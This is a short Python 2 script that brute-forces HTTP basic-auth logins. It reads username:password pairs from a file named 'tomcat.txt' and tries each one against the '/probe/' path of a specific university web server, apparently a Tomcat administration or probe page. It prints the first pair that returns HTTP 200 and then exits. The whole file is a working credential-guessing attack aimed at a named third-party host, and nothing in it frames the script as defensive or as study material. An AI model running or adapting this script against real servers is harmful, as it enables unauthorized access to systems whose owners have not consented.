import sys
import requests
with open("tomcat.txt") as f:
    for line in f:
        c=line.strip('\n').split(":")
        r=requests.get('https://jfpt.njtech.edu.cn/probe/', auth=(c[0], c[1]))
        
        if r.status_code == 200:
            print "Found valid credentials \"" + line.strip('\n') + "\""
            raise sys.exit()